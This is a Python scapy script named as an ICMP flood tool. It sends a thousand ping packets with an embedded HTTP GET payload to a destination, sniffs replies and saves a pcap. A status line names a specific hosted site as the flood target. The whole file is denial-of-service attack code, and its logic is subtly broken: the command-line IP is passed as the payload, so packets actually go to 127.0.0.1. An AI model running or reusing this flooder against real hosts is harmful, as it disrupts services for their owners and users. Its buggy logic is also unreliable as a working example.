from scapy.all import *
import os
import time
import random
import sys
import netifaces

def ICMP_Flooding(payload_data,dest_ip="127.0.0.1",num_pkts_send=1000,delay=0.001):
    print("Initializing Sniffer")
    sniffer=AsyncSniffer(
        iface="lo",
        filter=f"icmp and dst host {dest_ip}",
        store=True
    )
    sniffer.start()
    time.sleep(1)

    print(f"Starting ICMP flood on priyanshu23.pythonanywhere.com")
    packets=[]
    src_ip = netifaces.ifaddresses("wlp1s0")[netifaces.AF_INET][0]['addr']

    http_payload = f"GET {payload_data} HTTP/1.1\r\nHost: {dest_ip}\r\n\r\n"
    payload = Raw(load=http_payload)
    for i in range(num_pkts_send):
        ip_pkt=IP(src=src_ip,dst=dest_ip)
        icmp_pkt=ICMP(type=8)

        pkt=ip_pkt/icmp_pkt/payload
        send(pkt,verbose=0)
        packets.append(pkt)

        if (i+1)%100==0:
            print(f"{i+1} ICMP packets send..")

        time.sleep(delay)

    print(f"Send {num_pkts_send} ICMP packets to {dest_ip}..")
    print("Stopping sniffer")

    sniffer.stop()
    response=sniffer.results

    if response:
        print(f"Packets received: {len(response)}")
        response[0].summary()
        response[0].show()

        all_packets=response


    else:
        print("No response received from Server...")
        all_packets=packets

    print("Creating PCAP file...")
    print("Deleting previous pcap file..")

    if os.path.exists("analysis.pcap"):
        os.remove("analysis.pcap")

    wrpcap("analysis.pcap", all_packets)
    print("PCAP File created successfully...")


if __name__ == "__main__":
    argv = sys.argv
    if len(argv) != 2:
        raise ValueError("Usage: sudo python3 icmp_flood.py destination_ip")

    dest_ip = argv[-1]
    ICMP_Flooding(dest_ip)

